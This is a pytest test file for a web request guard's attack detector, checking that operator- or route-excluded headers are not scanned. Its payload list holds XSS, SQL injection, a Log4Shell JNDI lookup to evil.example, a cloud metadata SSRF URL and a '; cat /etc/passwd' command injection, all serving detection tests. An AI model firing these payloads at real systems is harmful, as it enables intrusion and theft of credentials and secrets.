import pytest

from guard_core.decorators.base import RouteConfig
from guard_core.models import SecurityConfig
from guard_core.utils import detect_penetration_attempt
from tests.conftest import MockGuardRequest

PAYLOADS = [
    "<script>alert(1)</script>",
    "' UNION SELECT password FROM users--",
    "${jndi:ldap://evil.example/a}",
    "http://169.254.169.254/latest/meta-data/",
    "; cat /etc/passwd",
]


async def _flagged(
    headers: dict[str, str],
    config: SecurityConfig | None = None,
    route_config: RouteConfig | None = None,
) -> bool:
    request = MockGuardRequest(path="/s", headers=headers)
    result = await detect_penetration_attempt(
        request, config or SecurityConfig(), route_config
    )
    return result.is_threat


@pytest.mark.parametrize("payload", PAYLOADS)
async def test_a_header_the_operator_lists_is_not_scanned_in_any_category(
    payload: str,
) -> None:
    config = SecurityConfig(excluded_detection_headers={"X-Report-Note"})

    assert await _flagged({"x-report-note": payload}) is True
    assert await _flagged({"x-report-note": payload}, config) is False
    assert await _flagged({"X-REPORT-NOTE": f"  {payload}"}, config) is False


async def test_the_exclusion_covers_only_the_listed_header() -> None:
    config = SecurityConfig(excluded_detection_headers={"x-report-note"})

    assert await _flagged({"x-other": "<script>alert(1)</script>"}, config) is True


async def test_a_route_listed_header_is_not_scanned_in_any_category() -> None:
    route_config = RouteConfig()
    route_config.excluded_detection_headers = {"x-report-note"}

    flagged_without = await _flagged({"x-report-note": "<script>alert(1)</script>"})
    flagged_with = await _flagged(
        {"x-report-note": "<script>alert(1)</script>"}, None, route_config
    )

    assert flagged_without is True
    assert flagged_with is False


async def test_a_built_in_default_header_the_operator_also_lists_is_fully_skipped() -> (
    None
):
    config = SecurityConfig(excluded_detection_headers={"user-agent"})
    headers = {"user-agent": "${jndi:ldap://evil.example/a}"}

    assert await _flagged(headers) is True
    assert await _flagged(headers, config) is False


async def test_a_built_in_default_header_skips_ssrf_only() -> None:
    assert await _flagged({"referer": "http://169.254.169.254/"}) is False
    assert await _flagged({"referer": "${jndi:ldap://evil.example/a}"}) is True


async def test_a_listed_cookie_header_skips_every_cookie_pair() -> None:
    config = SecurityConfig(excluded_detection_headers={"cookie"})
    headers = {"cookie": "a=1; q=<script>alert(1)</script>"}

    assert await _flagged(headers) is True
    assert await _flagged(headers, config) is False
